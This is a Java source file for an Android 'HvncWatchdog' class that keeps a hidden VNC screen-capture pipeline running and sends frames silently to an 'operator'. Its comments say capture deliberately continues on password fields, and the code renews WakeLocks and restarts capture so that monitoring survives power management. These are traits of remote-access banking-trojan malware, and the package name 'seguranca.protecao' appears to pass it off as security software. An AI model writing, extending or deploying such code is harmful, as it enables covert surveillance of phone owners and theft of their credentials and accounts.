package com.seguranca.protecao;

import android.content.Context;
import android.os.PowerManager;
import android.util.Log;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

/**
 * HvncWatchdog
 *
 * Monitors the silent capture pipeline health.
 * Solves:
 *   - HVNC dropping after ~10min (WakeLock expiry + capture thread death)
 *   - Black screen on password fields (suppresses wrong blackout behavior)
 *   - No frame receipt for extended periods → auto-restart
 *
 * Call flow:
 *   HvncWatchdog.getInstance().start(ctx)    → start monitoring
 *   HvncWatchdog.getInstance().onFrameSent() → call after every successful frame
 *   HvncWatchdog.getInstance().stop()        → stop monitoring
 */
public class HvncWatchdog {

    private static final String TAG = "HvncWatchdog";

    // ── Tuning ────────────────────────────────────────────────────────────────

    /** After this many ms with no frame, trigger restart. */
    private static final long   FRAME_STALE_MS      = 8_000;
    /** Watchdog tick interval. */
    private static final int    CHECK_INTERVAL_SEC  = 3;
    /** Min ms between restarts (prevent thrash). */
    private static final long   RESTART_COOLDOWN_MS = 12_000;
    /** WakeLock max hold per cycle (auto-released + re-acquired). */
    private static final long   WAKELOCK_CYCLE_MS   = 10 * 60 * 1000L; // 10 min
    /** After this many consecutive stale frames, give up until next start command. */
    private static final int    MAX_RESTARTS        = 10;

    // ── Singleton ─────────────────────────────────────────────────────────────

    private static volatile HvncWatchdog sInstance;

    public static HvncWatchdog getInstance() {
        if (sInstance == null) {
            synchronized (HvncWatchdog.class) {
                if (sInstance == null) sInstance = new HvncWatchdog();
            }
        }
        return sInstance;
    }

    // ── State ─────────────────────────────────────────────────────────────────

    private final AtomicBoolean active           = new AtomicBoolean(false);
    private final AtomicLong    lastFrameMs      = new AtomicLong(0);
    private final AtomicLong    lastRestartMs    = new AtomicLong(0);
    private final AtomicInteger restartCount     = new AtomicInteger(0);
    private final AtomicBoolean captureRunning   = new AtomicBoolean(false);

    // Password field flag — when true, we deliberately CONTINUE capturing
    // (the screen shows masked chars ●●●● anyway; black screen only hurt the operator)
    private final AtomicBoolean passwordFieldActive = new AtomicBoolean(false);

    private ScheduledExecutorService watchdogExec;
    private ScheduledFuture<?>       watchdogFuture;
    private volatile PowerManager.WakeLock captureWakeLock;
    private volatile Context         appCtx;

    private HvncWatchdog() {}

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    public void start(Context ctx) {
        appCtx = ctx.getApplicationContext();
        active.set(true);
        restartCount.set(0);
        lastFrameMs.set(System.currentTimeMillis());

        acquireWakeLock(appCtx);
        startWatchdogLoop();
        Log.i(TAG, "HVNC watchdog started");
    }

    public void stop() {
        active.set(false);
        stopWatchdogLoop();
        releaseWakeLock();
        captureRunning.set(false);
        Log.i(TAG, "HVNC watchdog stopped");
    }

    // ── Frame tracking ────────────────────────────────────────────────────────

    /** Called by UiAssistBridge.enqueueSilentFrame() after every successful encode. */
    public void onFrameSent() {
        lastFrameMs.set(System.currentTimeMillis());
        captureRunning.set(true);
    }

    /** Called when capture loop is confirmed running (onStartJob / command received). */
    public void onCaptureStarted() {
        captureRunning.set(true);
        lastFrameMs.set(System.currentTimeMillis());
        restartCount.set(0);
        // Ensure WakeLock is alive
        if (captureWakeLock == null || !captureWakeLock.isHeld()) {
            if (appCtx != null) acquireWakeLock(appCtx);
        }
    }

    /** Called when capture is intentionally stopped (command STOP_SILENT_VNC). */
    public void onCaptureStopped() {
        captureRunning.set(false);
        restartCount.set(0);
    }

    // ── Password field: pass-through mode ────────────────────────────────────

    /**
     * UiAssistBridge should call this when a password field gains focus.
     * Watchdog will ensure capture continues — no black screen is triggered.
     * The screenshot API renders password fields as ●●●● which is fine.
     */
    public void onPasswordFieldFocus(boolean active) {
        passwordFieldActive.set(active);
        // If capture somehow stopped, restart immediately
        if (active && !isCaptureHealthy()) {
            triggerRestart("password_field_focus");
        }
    }

    /** Returns true if the watchdog wants capture to continue despite password field. */
    public boolean shouldContinueDuringPasswordField() {
        return passwordFieldActive.get() && active.get();
    }

    // ── WakeLock management ───────────────────────────────────────────────────

    private void acquireWakeLock(Context ctx) {
        try {
            releaseWakeLock();
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            captureWakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "App:HvncCapture"
            );
            captureWakeLock.setReferenceCounted(false);
            // Acquire with cycle timeout — watchdog re-acquires before expiry
            captureWakeLock.acquire(WAKELOCK_CYCLE_MS);
            Log.d(TAG, "WakeLock acquired (" + (WAKELOCK_CYCLE_MS / 60000) + " min)");
        } catch (Exception e) {
            Log.w(TAG, "WakeLock acquire failed: " + e.getMessage());
        }
    }

    private void releaseWakeLock() {
        try {
            if (captureWakeLock != null && captureWakeLock.isHeld()) {
                captureWakeLock.release();
            }
        } catch (Exception ignored) {}
        captureWakeLock = null;
    }

    // ── Watchdog loop ─────────────────────────────────────────────────────────

    private void startWatchdogLoop() {
        stopWatchdogLoop();
        watchdogExec = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "HvncWatchdog");
            t.setDaemon(true);
            t.setPriority(Thread.MIN_PRIORITY);
            return t;
        });
        watchdogFuture = watchdogExec.scheduleWithFixedDelay(
            this::tick,
            CHECK_INTERVAL_SEC,
            CHECK_INTERVAL_SEC,
            TimeUnit.SECONDS
        );
    }

    private void stopWatchdogLoop() {
        if (watchdogFuture != null) { watchdogFuture.cancel(false); watchdogFuture = null; }
        if (watchdogExec != null)   { watchdogExec.shutdownNow(); watchdogExec = null; }
    }

    private void tick() {
        if (!active.get()) return;

        // Renew WakeLock if nearing expiry (< 60s left)
        renewWakeLockIfNeeded();

        // Only check staleness if capture is supposed to be running
        if (!captureRunning.get()) return;

        if (!isCaptureHealthy()) {
            int restarts = restartCount.get();
            if (restarts >= MAX_RESTARTS) {
                Log.w(TAG, "Max restarts reached (" + MAX_RESTARTS + "), giving up until next start command");
                captureRunning.set(false);
                return;
            }
            triggerRestart("stale_frames");
        }
    }

    private boolean isCaptureHealthy() {
        long age = System.currentTimeMillis() - lastFrameMs.get();
        return age < FRAME_STALE_MS;
    }

    private void renewWakeLockIfNeeded() {
        try {
            if (captureWakeLock == null || !captureWakeLock.isHeld()) {
                if (appCtx != null) acquireWakeLock(appCtx);
                return;
            }
            // WakeLock API doesn't expose remaining time; re-acquire every cycle
            // by releasing and re-acquiring (setReferenceCounted(false) makes this safe)
            captureWakeLock.release();
            captureWakeLock.acquire(WAKELOCK_CYCLE_MS);
        } catch (Exception e) {
            Log.w(TAG, "WakeLock renew failed: " + e.getMessage());
        }
    }

    private void triggerRestart(String reason) {
        long now = System.currentTimeMillis();
        long last = lastRestartMs.get();
        if (now - last < RESTART_COOLDOWN_MS) return;
        if (!lastRestartMs.compareAndSet(last, now)) return;

        int count = restartCount.incrementAndGet();
        Log.w(TAG, "Restarting HVNC capture — reason=" + reason + " attempt=" + count);

        // Update last frame time to avoid immediate re-trigger
        lastFrameMs.set(System.currentTimeMillis());

        try {
            int quality = UiAssistBridge.getSilentCaptureQuality();
            if (quality <= 0) quality = 25;
            UiAssistBridge.restartSilentScreenCapture(quality);
        } catch (Exception e) {
            Log.e(TAG, "Restart failed: " + e.getMessage());
        }
    }

    // ── Status ────────────────────────────────────────────────────────────────

    public int  getRestartCount()       { return restartCount.get(); }
    public long getMsSinceLastFrame()   { return System.currentTimeMillis() - lastFrameMs.get(); }
    public boolean isActive()           { return active.get(); }
    public boolean isCaptureRunning()   { return captureRunning.get(); }
}
